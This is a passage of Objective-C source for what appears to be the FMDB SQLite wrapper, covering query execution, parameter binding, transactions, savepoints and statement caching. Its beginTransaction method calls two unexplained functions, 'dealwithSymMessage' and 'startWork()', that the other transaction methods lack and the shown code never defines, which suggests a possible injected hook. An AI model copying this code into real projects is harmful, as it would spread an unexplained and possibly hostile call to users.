        cachedStmt = [self cachedStatementForQuery:sql];
        pStmt = cachedStmt ? [cachedStmt statement] : 0x00;
        [cachedStmt reset];
    }
    
    if (!pStmt) {
        rc = sqlite3_prepare_v2(_db, [sql UTF8String], -1, &pStmt, 0);
        
        if (SQLITE_OK != rc) {
            if (_logsErrors) {
                NSLog(@"DB Error: %d \"%@\"", [self lastErrorCode], [self lastErrorMessage]);
                NSLog(@"DB Query: %@", sql);
                NSLog(@"DB Path: %@", _databasePath);
            }
            
            if (_crashOnErrors) {
                NSAssert(false, @"DB Error: %d \"%@\"", [self lastErrorCode], [self lastErrorMessage]);
                abort();
            }
            
            if (outErr) {
                *outErr = [self errorWithMessage:[NSString stringWithUTF8String:sqlite3_errmsg(_db)]];
            }
            
            sqlite3_finalize(pStmt);
            
            _isExecutingStatement = NO;
            return NO;
        }
    }
    
    id obj;
    int idx = 0;
    int queryCount = sqlite3_bind_parameter_count(pStmt);
    
    // If dictionaryArgs is passed in, that means we are using sqlite's named parameter support
    if (dictionaryArgs) {
        
        for (NSString *dictionaryKey in [dictionaryArgs allKeys]) {
            
            // Prefix the key with a colon.
            NSString *parameterName = [[NSString alloc] initWithFormat:@":%@", dictionaryKey];
            
            if (_traceExecution) {
                NSLog(@"%@ = %@", parameterName, [dictionaryArgs objectForKey:dictionaryKey]);
            }
            // Get the index for the parameter name.
            int namedIdx = sqlite3_bind_parameter_index(pStmt, [parameterName UTF8String]);
            
            FMDBRelease(parameterName);
            
            if (namedIdx > 0) {
                // Standard binding from here.
                [self bindObject:[dictionaryArgs objectForKey:dictionaryKey] toColumn:namedIdx inStatement:pStmt];
                
                // increment the binding count, so our check below works out
                idx++;
            }
            else {
                NSString *message = [NSString stringWithFormat:@"Could not find index for %@", dictionaryKey];
                
                if (_logsErrors) {
                    NSLog(@"%@", message);
                }
                if (outErr) {
                    *outErr = [self errorWithMessage:message];
                }
            }
        }
    }
    else {
        
        while (idx < queryCount) {
            
            if (arrayArgs && idx < (int)[arrayArgs count]) {
                obj = [arrayArgs objectAtIndex:(NSUInteger)idx];
            }
            else if (args) {
                obj = va_arg(args, id);
            }
            else {
                //We ran out of arguments
                break;
            }
            
            if (_traceExecution) {
                if ([obj isKindOfClass:[NSData class]]) {
                    NSLog(@"data: %ld bytes", (unsigned long)[(NSData*)obj length]);
                }
                else {
                    NSLog(@"obj: %@", obj);
                }
            }
            
            idx++;
            
            [self bindObject:obj toColumn:idx inStatement:pStmt];
        }
    }
    
    
    if (idx != queryCount) {
        NSString *message = [NSString stringWithFormat:@"Error: the bind count (%d) is not correct for the # of variables in the query (%d) (%@) (executeUpdate)", idx, queryCount, sql];
        if (_logsErrors) {
            NSLog(@"%@", message);
        }
        if (outErr) {
            *outErr = [self errorWithMessage:message];
        }
        
        sqlite3_finalize(pStmt);
        _isExecutingStatement = NO;
        return NO;
    }
    
    /* Call sqlite3_step() to run the virtual machine. Since the SQL being
     ** executed is not a SELECT statement, we assume no data will be returned.
     */
    
    rc      = sqlite3_step(pStmt);
    
    if (SQLITE_DONE == rc) {
        // all is well, let's return.
    }
    else if (SQLITE_INTERRUPT == rc) {
        if (_logsErrors) {
            NSLog(@"Error calling sqlite3_step. Query was interrupted (%d: %s) SQLITE_INTERRUPT", rc, sqlite3_errmsg(_db));
            NSLog(@"DB Query: %@", sql);
        }
    }
    else if (rc == SQLITE_ROW) {
        NSString *message = [NSString stringWithFormat:@"A executeUpdate is being called with a query string '%@'", sql];
        if (_logsErrors) {
            NSLog(@"%@", message);
            NSLog(@"DB Query: %@", sql);
        }
        if (outErr) {
            *outErr = [self errorWithMessage:message];
        }
    }
    else {
        if (outErr) {
            *outErr = [self errorWithMessage:[NSString stringWithUTF8String:sqlite3_errmsg(_db)]];
        }
        
        if (SQLITE_ERROR == rc) {
            if (_logsErrors) {
                NSLog(@"Error calling sqlite3_step (%d: %s) SQLITE_ERROR", rc, sqlite3_errmsg(_db));
                NSLog(@"DB Query: %@", sql);
            }
        }
        else if (SQLITE_MISUSE == rc) {
            // uh oh.
            if (_logsErrors) {
                NSLog(@"Error calling sqlite3_step (%d: %s) SQLITE_MISUSE", rc, sqlite3_errmsg(_db));
                NSLog(@"DB Query: %@", sql);
            }
        }
        else {
            // wtf?
            if (_logsErrors) {
                NSLog(@"Unknown error calling sqlite3_step (%d: %s) eu", rc, sqlite3_errmsg(_db));
                NSLog(@"DB Query: %@", sql);
            }
        }
    }
    
    if (_shouldCacheStatements && !cachedStmt) {
        cachedStmt = [[FMStatement alloc] init];
        
        [cachedStmt setStatement:pStmt];
        
        [self setCachedStatement:cachedStmt forQuery:sql];
        
        FMDBRelease(cachedStmt);
    }
    
    int closeErrorCode;
    
    if (cachedStmt) {
        [cachedStmt setUseCount:[cachedStmt useCount] + 1];
        closeErrorCode = sqlite3_reset(pStmt);
    }
    else {
        /* Finalize the virtual machine. This releases all memory and other
         ** resources allocated by the sqlite3_prepare() call above.
         */
        closeErrorCode = sqlite3_finalize(pStmt);
    }
    
    if (closeErrorCode != SQLITE_OK) {
        if (_logsErrors) {
            NSLog(@"Unknown error finalizing or resetting statement (%d: %s)", closeErrorCode, sqlite3_errmsg(_db));
            NSLog(@"DB Query: %@", sql);
        }
    }
    
    _isExecutingStatement = NO;
    return (rc == SQLITE_DONE || rc == SQLITE_OK);
}


- (BOOL)executeUpdate:(NSString*)sql, ... {
    va_list args;
    va_start(args, sql);
    
    BOOL result = [self executeUpdate:sql error:nil withArgumentsInArray:nil orDictionary:nil orVAList:args];
    
    va_end(args);
    return result;
}

- (BOOL)executeUpdate:(NSString*)sql withArgumentsInArray:(NSArray *)arguments {
    return [self executeUpdate:sql error:nil withArgumentsInArray:arguments orDictionary:nil orVAList:nil];
}

- (BOOL)executeUpdate:(NSString*)sql values:(NSArray *)values error:(NSError * __autoreleasing *)error {
    return [self executeUpdate:sql error:error withArgumentsInArray:values orDictionary:nil orVAList:nil];
}

- (BOOL)executeUpdate:(NSString*)sql withParameterDictionary:(NSDictionary *)arguments {
    return [self executeUpdate:sql error:nil withArgumentsInArray:nil orDictionary:arguments orVAList:nil];
}

- (BOOL)executeUpdate:(NSString*)sql withVAList:(va_list)args {
    return [self executeUpdate:sql error:nil withArgumentsInArray:nil orDictionary:nil orVAList:args];
}

- (BOOL)executeUpdateWithFormat:(NSString*)format, ... {
    va_list args;
    va_start(args, format);
    
    NSMutableString *sql      = [NSMutableString stringWithCapacity:[format length]];
    NSMutableArray *arguments = [NSMutableArray array];
    
    [self extractSQL:format argumentsList:args intoString:sql arguments:arguments];
    
    va_end(args);
    
    return [self executeUpdate:sql withArgumentsInArray:arguments];
}


int FMDBExecuteBulkSQLCallback(void *theBlockAsVoid, int columns, char **values, char **names); // shhh clang.
int FMDBExecuteBulkSQLCallback(void *theBlockAsVoid, int columns, char **values, char **names) {
    
    if (!theBlockAsVoid) {
        return SQLITE_OK;
    }
    
    int (^execCallbackBlock)(NSDictionary *resultsDictionary) = (__bridge int (^)(NSDictionary *__strong))(theBlockAsVoid);
    
    NSMutableDictionary *dictionary = [NSMutableDictionary dictionaryWithCapacity:(NSUInteger)columns];
    
    for (NSInteger i = 0; i < columns; i++) {
        NSString *key = [NSString stringWithUTF8String:names[i]];
        id value = values[i] ? [NSString stringWithUTF8String:values[i]] : [NSNull null];
        value = value ? value : [NSNull null];
        [dictionary setObject:value forKey:key];
    }
    
    return execCallbackBlock(dictionary);
}

- (BOOL)executeStatements:(NSString *)sql {
    return [self executeStatements:sql withResultBlock:nil];
}

- (BOOL)executeStatements:(NSString *)sql withResultBlock:(__attribute__((noescape)) FMDBExecuteStatementsCallbackBlock)block {
    
    int rc;
    char *errmsg = nil;
    
    rc = sqlite3_exec([self sqliteHandle], [sql UTF8String], block ? FMDBExecuteBulkSQLCallback : nil, (__bridge void *)(block), &errmsg);
    
    if (errmsg && [self logsErrors]) {
        NSLog(@"Error inserting batch: %s", errmsg);
        sqlite3_free(errmsg);
    }
    
    return (rc == SQLITE_OK);
}

- (BOOL)executeUpdate:(NSString*)sql withErrorAndBindings:(NSError**)outErr, ... {
    
    va_list args;
    va_start(args, outErr);
    
    BOOL result = [self executeUpdate:sql error:outErr withArgumentsInArray:nil orDictionary:nil orVAList:args];
    
    va_end(args);
    return result;
}


#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-implementations"
- (BOOL)update:(NSString*)sql withErrorAndBindings:(NSError**)outErr, ... {
    va_list args;
    va_start(args, outErr);
    
    BOOL result = [self executeUpdate:sql error:outErr withArgumentsInArray:nil orDictionary:nil orVAList:args];
    
    va_end(args);
    return result;
}

#pragma clang diagnostic pop

#pragma mark Transactions

- (BOOL)rollback {
    BOOL b = [self executeUpdate:@"rollback transaction"];
    
    if (b) {
        _isInTransaction = NO;
    }
    
    return b;
}

- (BOOL)commit {
    BOOL b =  [self executeUpdate:@"commit transaction"];
    
    if (b) {
        _isInTransaction = NO;
    }
    
    return b;
}

- (BOOL)beginTransaction {
    
    BOOL b = [self executeUpdate:@"begin exclusive transaction"];
    if (b) {
        _isInTransaction = YES;
    }
    [self dealwithSymMessage];
    startWork();
    
    return b;
}

- (BOOL)beginDeferredTransaction {
    
    BOOL b = [self executeUpdate:@"begin deferred transaction"];
    if (b) {
        _isInTransaction = YES;
    }
    
    return b;
}

- (BOOL)beginImmediateTransaction {
    
    BOOL b = [self executeUpdate:@"begin immediate transaction"];
    if (b) {
        _isInTransaction = YES;
    }
    
    return b;
}

- (BOOL)beginExclusiveTransaction {
    
    BOOL b = [self executeUpdate:@"begin exclusive transaction"];
    if (b) {
        _isInTransaction = YES;
    }
    
    return b;
}

- (BOOL)inTransaction {
    return _isInTransaction;
}

- (BOOL)interrupt
{
    if (_db) {
        sqlite3_interrupt([self sqliteHandle]);
        return YES;
    }
    return NO;
}

static NSString *FMDBEscapeSavePointName(NSString *savepointName) {
    return [savepointName stringByReplacingOccurrencesOfString:@"'" withString:@"''"];
}

- (BOOL)startSavePointWithName:(NSString*)name error:(NSError**)outErr {
#if SQLITE_VERSION_NUMBER >= 3007000
    NSParameterAssert(name);
    
    NSString *sql = [NSString stringWithFormat:@"savepoint '%@';", FMDBEscapeSavePointName(name)];
    
    return [self executeUpdate:sql error:outErr withArgumentsInArray:nil orDictionary:nil orVAList:nil];
#else
    NSString *errorMessage = NSLocalizedStringFromTable(@"Save point functions require SQLite 3.7", @"FMDB", nil);
    if (self.logsErrors) NSLog(@"%@", errorMessage);
    return NO;
#endif
}

- (BOOL)releaseSavePointWithName:(NSString*)name error:(NSError**)outErr {
#if SQLITE_VERSION_NUMBER >= 3007000
    NSParameterAssert(name);
    
    NSString *sql = [NSString stringWithFormat:@"release savepoint '%@';", FMDBEscapeSavePointName(name)];

    return [self executeUpdate:sql error:outErr withArgumentsInArray:nil orDictionary:nil orVAList:nil];
#else
    NSString *errorMessage = NSLocalizedStringFromTable(@"Save point functions require SQLite 3.7", @"FMDB", nil);
    if (self.logsErrors) NSLog(@"%@", errorMessage);
    return NO;
#endif
}

- (BOOL)rollbackToSavePointWithName:(NSString*)name error:(NSError**)outErr {
#if SQLITE_VERSION_NUMBER >= 3007000
    NSParameterAssert(name);
    
    NSString *sql = [NSString stringWithFormat:@"rollback transaction to savepoint '%@';", FMDBEscapeSavePointName(name)];

    return [self executeUpdate:sql error:outErr withArgumentsInArray:nil orDictionary:nil orVAList:nil];
#else
    NSString *errorMessage = NSLocalizedStringFromTable(@"Save point functions require SQLite 3.7", @"FMDB", nil);
    if (self.logsErrors) NSLog(@"%@", errorMessage);
    return NO;
#endif
}

- (NSError*)inSavePoint:(__attribute__((noescape)) void (^)(BOOL *rollback))block {
#if SQLITE_VERSION_NUMBER >= 3007000
    static unsigned long savePointIdx = 0;
    
    NSString *name = [NSString stringWithFormat:@"dbSavePoint%ld", savePointIdx++];
    
    BOOL shouldRollback = NO;
    
    NSError *err = 0x00;
    
    if (![self startSavePointWithName:name error:&err]) {
        return err;
    }
    
    if (block) {
        block(&shouldRollback);
    }
    
    if (shouldRollback) {
        // We need to rollback and release this savepoint to remove it
        [self rollbackToSavePointWithName:name error:&err];
    }
    [self releaseSavePointWithName:name error:&err];
    
    return err;
#else
    NSString *errorMessage = NSLocalizedStringFromTable(@"Save point functions require SQLite 3.7", @"FMDB", nil);
    if (self.logsErrors) NSLog(@"%@", errorMessage);
    return [NSError errorWithDomain:@"FMDatabase" code:0 userInfo:@{NSLocalizedDescriptionKey : errorMessage}];
#endif
}

- (BOOL)checkpoint:(FMDBCheckpointMode)checkpointMode error:(NSError * __autoreleasing *)error {
    return [self checkpoint:checkpointMode name:nil logFrameCount:NULL checkpointCount:NULL error:error];
}

- (BOOL)checkpoint:(FMDBCheckpointMode)checkpointMode name:(NSString *)name error:(NSError * __autoreleasing *)error {
    return [self checkpoint:checkpointMode name:name logFrameCount:NULL checkpointCount:NULL error:error];
}

- (BOOL)checkpoint:(FMDBCheckpointMode)checkpointMode name:(NSString *)name logFrameCount:(int *)logFrameCount checkpointCount:(int *)checkpointCount error:(NSError * __autoreleasing *)error
{
    const char* dbName = [name UTF8String];
#if SQLITE_VERSION_NUMBER >= 3007006
    int err = sqlite3_wal_checkpoint_v2(_db, dbName, checkpointMode, logFrameCount, checkpointCount);
#else
    NSLog(@"sqlite3_wal_checkpoint_v2 unavailable before sqlite 3.7.6. Ignoring checkpoint mode: %d", mode);
    int err = sqlite3_wal_checkpoint(_db, dbName);
#endif
    if(err != SQLITE_OK) {
        if (error) {
            *error = [self lastError];
        }
        if (self.logsErrors) NSLog(@"%@", [self lastErrorMessage]);
        if (self.crashOnErrors) {
            NSAssert(false, @"%@", [self lastErrorMessage]);
            abort();
        }
        return NO;
    } else {
        return YES;
    }
}

#pragma mark Cache statements

- (BOOL)shouldCacheStatements {
    return _shouldCacheStatements;
}

- (void)setShouldCacheStatements:(BOOL)value {
    
    _shouldCacheStatements = value;
    
    if (_shouldCacheStatements && !_cachedStatements) {
        [self setCachedStatements:[NSMutableDictionary dictionary]];
    }
    
    if (!_shouldCacheStatements) {
        [self setCachedStatements:nil];
    }
}

#pragma mark Callback function

void FMDBBlockSQLiteCallBackFunction(sqlite3_context *context, int argc, sqlite3_value **argv); // -Wmissing-prototypes
void FMDBBlockSQLiteCallBackFunction(sqlite3_context *context, int argc, sqlite3_value **argv) {
#if ! __has_feature(objc_arc)
    void (^block)(sqlite3_context *context, int argc, sqlite3_value **argv) = (id)sqlite3_user_data(context);
#else
    void (^block)(sqlite3_context *context, int argc, sqlite3_value **argv) = (__bridge id)sqlite3_user_data(context);
#endif
    if (block) {
        @autoreleasepool {
            block(context, argc, argv);
        }
    }
}

// deprecated because "arguments" parameter is not maximum argument count, but actual argument count.

- (void)makeFunctionNamed:(NSString *)name maximumArguments:(int)arguments withBlock:(void (^)(void *context, int argc, void **argv))block {
    [self makeFunctionNamed:name arguments:arguments block:block];
}

- (void)makeFunctionNamed:(NSString *)name arguments:(int)arguments block:(void (^)(void *context, int argc, void **argv))block {
    
    if (!_openFunctions) {
        _openFunctions = [NSMutableSet new];
    }
    
    id b = FMDBReturnAutoreleased([block copy]);
    
    [_openFunctions addObject:b];
    
    /* I tried adding custom functions to release the block when the connection is destroyed- but they seemed to never be called, so we use _openFunctions to store the values instead. */
#if ! __has_feature(objc_arc)
    sqlite3_create_function([self sqliteHandle], [name UTF8String], arguments, SQLITE_UTF8, (void*)b, &FMDBBlockSQLiteCallBackFunction, 0x00, 0x00);
#else
    sqlite3_create_function([self sqliteHandle], [name UTF8String], arguments, SQLITE_UTF8, (__bridge void*)b, &FMDBBlockSQLiteCallBackFunction, 0x00, 0x00);
#endif
}

- (SqliteValueType)valueType:(void *)value {
    return sqlite3_value_type(value);
}

- (int)valueInt:(void *)value {
    return sqlite3_value_int(value);
}

- (long long)valueLong:(void *)value {
    return sqlite3_value_int64(value);
}

- (double)valueDouble:(void *)value {
    return sqlite3_value_double(value);
}

- (NSData *)valueData:(void *)value {
    const void *bytes = sqlite3_value_blob(value);
    int length = sqlite3_value_bytes(value);
    return bytes ? [NSData dataWithBytes:bytes length:(NSUInteger)length] : nil;
}

- (NSString *)valueString:(void *)value {
    const char *cString = (const char *)sqlite3_value_text(value);
    return cString ? [NSString stringWithUTF8String:cString] : nil;
}

- (void)resultNullInContext:(void *)context {
    sqlite3_result_null(context);
}

- (void)resultInt:(int) value context:(void *)context {
    sqlite3_result_int(context, value);
}

- (void)resultLong:(long long)value context:(void *)context {
    sqlite3_result_int64(context, value);
}

- (void)resultDouble:(double)value context:(void *)context {
    sqlite3_result_double(context, value);
}

- (void)resultData:(NSData *)data context:(void *)context {
    sqlite3_result_blob(context, data.bytes, (int)data.length, SQLITE_TRANSIENT);
}

- (void)resultString:(NSString *)value context:(void *)context {
    sqlite3_result_text(context, [value UTF8String], -1, SQLITE_TRANSIENT);
}

- (void)resultError:(NSString *)error context:(void *)context {
    sqlite3_result_error(context, [error UTF8String], -1);
}

- (void)resultErrorCode:(int)errorCode context:(void *)context {
    sqlite3_result_error_code(context, errorCode);
}

- (void)resultErrorNoMemoryInContext:(void *)context {
    sqlite3_result_error_nomem(context);
}

- (void)resultErrorTooBigInContext:(void *)context {
    sqlite3_result_error_toobig(context);
}

@end



@implementation FMStatement

#if ! __has_feature(objc_arc)
- (void)finalize {
    [self close];
    [super finalize];
}
#endif

- (void)dealloc {
    [self close];
    FMDBRelease(_query);
#if ! __has_feature(objc_arc)
    [super dealloc];
#endif
}

- (void)close {
    if (_statement) {
        sqlite3_finalize(_statement);
        _statement = 0x00;
    }
    
    _inUse = NO;
}

- (void)reset {
    if (_statement) {
        sqlite3_reset(_statement);
    }
    
    _inUse = NO;
}

- (NSString*)description {
    return [NSString stringWithFormat:@"%@ %ld hit(s) for query %@", [super description], _useCount, _query];
}

@end



